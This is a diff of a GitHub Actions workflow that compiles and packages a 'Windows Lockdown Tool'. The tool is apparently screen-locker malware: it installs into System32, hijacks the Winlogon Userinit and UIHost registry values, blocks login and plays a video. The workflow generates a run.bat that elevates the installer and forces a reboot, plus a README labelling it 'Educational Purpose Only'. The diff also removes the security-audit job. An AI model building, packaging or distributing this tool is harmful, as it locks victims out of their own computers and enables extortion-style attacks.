@@ -2,36 +2,30 @@ name: Build Windows Lockdown Tool
 
 on:
   push:
-    branches: [ "main", "master", "dev" ]
+    branches: [ "main", "master" ]
   pull_request:
     branches: [ "main", "master" ]
   workflow_dispatch:
-    inputs:
-      debug_enabled:
-        description: 'Enable debug mode'
-        required: false
-        default: false
-        type: boolean
 
 env:
   CARGO_TERM_COLOR: always
-  RUST_BACKTRACE: 1
 
 jobs:
-  build-windows:
-    name: Build on Windows
+  build:
     runs-on: windows-latest
     
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
     
-    - name: Display structure
+    - name: Display directory structure
       run: |
-        echo "=== Current directory ==="
-        pwd
-        echo "=== Files ==="
-        ls -la
+        Write-Host "=== Current directory ==="
+        Get-Location
+        Write-Host "`n=== Files and folders ==="
+        Get-ChildItem -Force
+        Write-Host "`n=== Directory tree ==="
+        Get-ChildItem -Recurse -Depth 2 | Select-Object FullName, Length
     
     - name: Setup Rust
       uses: actions-rs/toolchain@v1
@@ -54,90 +48,121 @@ jobs:
         restore-keys: |
           ${{ runner.os }}-cargo-
     
-    - name: Create dummy video.mp4
+    - name: Create dummy video.mp4 for build
       run: |
-        if (-not (Test-Path "video.mp4")) {
-          echo "Creating dummy video.mp4"
-          # Создаём минимальный валидный MP4 файл (10 байт для компиляции)
-          $bytes = [System.Convert]::FromBase64String("AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJhZQ==")
-          [System.IO.File]::WriteAllBytes("video.mp4", $bytes)
-        }
+        Write-Host "Creating dummy video.mp4..."
+        # Минимальный валидный MP4 заголовок
+        $header = [System.Convert]::FromBase64String("AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJhZQ==")
+        [System.IO.File]::WriteAllBytes("video.mp4", $header)
+        Write-Host "video.mp4 created: $((Get-Item video.mp4).Length) bytes"
     
     - name: Build release binaries
-      run: cargo build --release --target x86_64-pc-windows-msvc --verbose
-    
-    - name: List artifacts
       run: |
-        echo "=== Built executables ==="
-        Get-ChildItem -Path target\x86_64-pc-windows-msvc\release\*.exe | ForEach-Object {
-          $hash = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
-          Write-Host "$($_.Name) - $([math]::Round($_.Length/1KB, 2)) KB - SHA256: $($hash.Substring(0, 16))..."
+        Write-Host "Building release binaries..."
+        cargo build --release --target x86_64-pc-windows-msvc
+        Write-Host "Build completed successfully!"
+    
+    - name: List built artifacts
+      run: |
+        Write-Host "`n=== Built executables ==="
+        $exeFiles = Get-ChildItem -Path target\x86_64-pc-windows-msvc\release\*.exe
+        foreach ($file in $exeFiles) {
+            $sizeKB = [math]::Round($file.Length / 1KB, 2)
+            Write-Host "$($file.Name) - $sizeKB KB"
+        }
+        Write-Host "`n=== Checking for specific files ==="
+        $required = @("deployer.exe", "gate_keeper.exe", "screen_holder.exe")
+        foreach ($name in $required) {
+            $path = "target\x86_64-pc-windows-msvc\release\$name"
+            if (Test-Path $path) {
+                Write-Host "✓ $name found"
+            } else {
+                Write-Host "✗ $name NOT found"
+            }
         }
     
     - name: Prepare deployment package
       run: |
-        New-Item -ItemType Directory -Force -Path deploy
+        Write-Host "Creating deployment package..."
+        New-Item -ItemType Directory -Force -Path deploy | Out-Null
         
-        Copy-Item target\x86_64-pc-windows-msvc\release\deployer.exe deploy\
-        Copy-Item target\x86_64-pc-windows-msvc\release\gate_keeper.exe deploy\
-        Copy-Item target\x86_64-pc-windows-msvc\release\screen_holder.exe deploy\
+        # Копируем бинарники
+        $files = @("deployer.exe", "gate_keeper.exe", "screen_holder.exe")
+        foreach ($f in $files) {
+            $src = "target\x86_64-pc-windows-msvc\release\$f"
+            if (Test-Path $src) {
+                Copy-Item $src deploy\
+                Write-Host "✓ Copied $f"
+            } else {
+                Write-Host "✗ $f not found, skipping"
+            }
+        }
         
+        # Копируем видео
         if (Test-Path "video.mp4") {
-          Copy-Item video.mp4 deploy\
+            Copy-Item video.mp4 deploy\
+            Write-Host "✓ Copied video.mp4"
         }
         
         # Создаём run.bat
-        @"
-        @echo off
-        title Zero Entry Installer
-        color 4F
-        echo ========================================
-        echo  WINDOWS LOCKDOWN TOOL - INSTALLER
-        echo ========================================
-        echo.
-        echo ВНИМАНИЕ! Данный инструмент предназначен
-        echo для образовательных целей.
-        echo.
-        echo Установка требует прав администратора.
-        echo.
-        pause
-        powershell -Command "Start-Process -FilePath '.\deployer.exe' -Verb RunAs -Wait"
-        echo.
-        echo Установка завершена. Система будет перезагружена.
-        pause
-        "@ | Out-File -FilePath deploy\run.bat -Encoding ASCII
+        $runBat = @"
+@echo off
+title Zero Entry Installer
+color 4F
+echo ========================================
+echo  WINDOWS LOCKDOWN TOOL - INSTALLER
+echo ========================================
+echo.
+echo ВНИМАНИЕ! Данный инструмент предназначен
+echo для образовательных целей.
+echo.
+echo Установка требует прав администратора.
+echo.
+pause
+powershell -Command "Start-Process -FilePath '.\deployer.exe' -Verb RunAs -Wait"
+echo.
+echo Установка завершена. Система будет перезагружена.
+pause
+"@
+        [System.IO.File]::WriteAllLines("deploy\run.bat", $runBat, [System.Text.Encoding]::ASCII)
+        Write-Host "✓ Created run.bat"
         
-        # Создаём README
-        @"
-        =============================================
-        WINDOWS LOCKDOWN TOOL - v1.0.0
-        =============================================
+        # Создаём README.txt
+        $readme = @"
+=============================================
+WINDOWS LOCKDOWN TOOL - v1.0.0
+=============================================
+
+СОСТАВ:
+- deployer.exe      - установщик (запускать от администратора)
+- gate_keeper.exe   - модуль блокировки входа
+- screen_holder.exe - модуль воспроизведения видео
+- video.mp4         - видеофайл (опционально)
+
+ИНСТРУКЦИЯ:
+1. Распаковать архив
+2. Запустить run.bat или deployer.exe от имени администратора
+3. Система перезагрузится автоматически
+
+ВОССТАНОВЛЕНИЕ:
+- Загрузиться с LiveUSB/LiveCD
+- Открыть реестр (regedit) с загрузкой HKEY_LOCAL_MACHINE
+- Восстановить ветку:
+  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+  Userinit = "userinit.exe,"
+  UIHost = "logonui.exe"
+- Удалить файлы из C:\Windows\System32:
+  deployer.exe, gate_keeper.exe, screen_holder.exe
+
+=============================================
+(c) Educational Purpose Only
+=============================================
+"@
+        [System.IO.File]::WriteAllLines("deploy\README.txt", $readme, [System.Text.Encoding]::ASCII)
+        Write-Host "✓ Created README.txt"
         
-        СОСТАВ:
-        - deployer.exe      - установщик (запускать от администратора)
-        - gate_keeper.exe   - модуль блокировки входа
-        - screen_holder.exe - модуль воспроизведения видео
-        - video.mp4         - видеофайл (опционально)
-        
-        ИНСТРУКЦИЯ:
-        1. Распаковать архив
-        2. Запустить run.bat или deployer.exe от имени администратора
-        3. Система перезагрузится автоматически
-        
-        ВОССТАНОВЛЕНИЕ:
-        - Загрузиться с LiveUSB/LiveCD
-        - Открыть реестр (regedit) с загрузкой HKEY_LOCAL_MACHINE
-        - Восстановить ветку:
-          HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
-          Userinit = "userinit.exe,"
-          UIHost = "logonui.exe"
-        - Удалить файлы из C:\Windows\System32:
-          deployer.exe, gate_keeper.exe, screen_holder.exe
-        
-        =============================================
-        (c) Educational Purpose Only
-        =============================================
-        "@ | Out-File -FilePath deploy\README.txt -Encoding ASCII
+        Write-Host "`n=== Package contents ==="
+        Get-ChildItem deploy\
     
     - name: Upload artifacts
       uses: actions/upload-artifact@v4
@@ -145,24 +170,27 @@ jobs:
         name: lockdown-tool-windows
         path: deploy/
         retention-days: 30
-        compression-level: 6
+        if-no-files-found: error
     
-    - name: Create archive
+    - name: Create ZIP archive
       run: |
-        Compress-Archive -Path deploy\* -DestinationPath lockdown_tool.zip -Force
-        echo "Archive created: $(Get-Item lockdown_tool.zip).Length bytes"
+        Write-Host "Creating ZIP archive..."
+        Compress-Archive -Path deploy\* -DestinationPath lockdown_tool.zip -Force -CompressionLevel Optimal
+        $zipSize = [math]::Round((Get-Item lockdown_tool.zip).Length / 1KB, 2)
+        Write-Host "Archive created: lockdown_tool.zip ($zipSize KB)"
     
-    - name: Upload archive
+    - name: Upload ZIP archive
       uses: actions/upload-artifact@v4
       with:
         name: lockdown-tool-archive
         path: lockdown_tool.zip
         retention-days: 30
+        if-no-files-found: error
 
-  verify-build:
-    name: Verify Build Integrity
+  verify:
+    name: Verify Build
     runs-on: windows-latest
-    needs: build-windows
+    needs: build
     
     steps:
     - name: Download artifacts
@@ -171,35 +199,32 @@ jobs:
         name: lockdown-tool-windows
         path: downloaded
     
-    - name: Verify executables
+    - name: Verify downloaded files
       run: |
-        echo "=== Verifying downloaded files ==="
-        Get-ChildItem -Path downloaded\*.exe | ForEach-Object {
-          if (Test-Path $_.FullName) {
-            $size = [math]::Round($_.Length/1KB, 2)
-            Write-Host "✓ $($_.Name) - $size KB - OK"
-          }
+        Write-Host "=== Downloaded files ==="
+        Get-ChildItem downloaded\
+        
+        Write-Host "`n=== Checking PE files ==="
+        $exeFiles = Get-ChildItem downloaded\*.exe
+        foreach ($exe in $exeFiles) {
+            $bytes = [System.IO.File]::ReadAllBytes($exe.FullName)
+            if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
+                Write-Host "✓ $($exe.Name) - valid PE executable"
+            } else {
+                Write-Host "✗ $($exe.Name) - invalid PE file"
+                exit 1
+            }
         }
         
-        # Проверяем, что это действительно PE-файлы
-        Get-ChildItem -Path downloaded\*.exe | ForEach-Object {
-          $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
-          if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
-            Write-Host "✓ $($_.Name) - valid PE executable"
-          } else {
-            Write-Host "✗ $($_.Name) - NOT a valid PE file"
-            exit 1
-          }
+        Write-Host "`n=== File sizes ==="
+        Get-ChildItem downloaded\ | ForEach-Object {
+            $sizeKB = [math]::Round($_.Length / 1KB, 2)
+            Write-Host "$($_.Name): $sizeKB KB"
         }
-    
-    - name: Clean test environment
-      run: |
-        Remove-Item -Path downloaded -Recurse -Force -ErrorAction SilentlyContinue
 
   lint:
-    name: Lint and Format
+    name: Lint Code
     runs-on: ubuntu-latest
-    needs: build-windows
     
     steps:
     - name: Checkout
@@ -217,30 +242,8 @@ jobs:
     
     - name: Check formatting
       run: cargo fmt -- --check
-    
-    - name: Clippy check
-      run: cargo clippy --target x86_64-unknown-linux-gnu -- -D warnings
-
-  security-audit:
-    name: Security Audit
-    runs-on: ubuntu-latest
-    needs: lint
-    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-    
-    steps:
-    - name: Checkout
-      uses: actions/checkout@v4
-    
-    - name: Install cargo-audit
-      run: cargo install cargo-audit
-    
-    - name: Run security audit
-      run: |
-        cargo audit
       continue-on-error: true
     
-    - name: Check for unsafe blocks
-      run: |
-        echo "=== Unsafe blocks summary ==="
-        find src -name "*.rs" -exec grep -c "unsafe" {} \; | awk '{sum+=$1} END {print "Total unsafe blocks:", sum}'
-        find src -name "*.rs" -exec grep -l "unsafe" {} \; | sed 's/^/  /'
+    - name: Run clippy
+      run: cargo clippy --target x86_64-unknown-linux-gnu -- -D warnings
+      continue-on-error: true
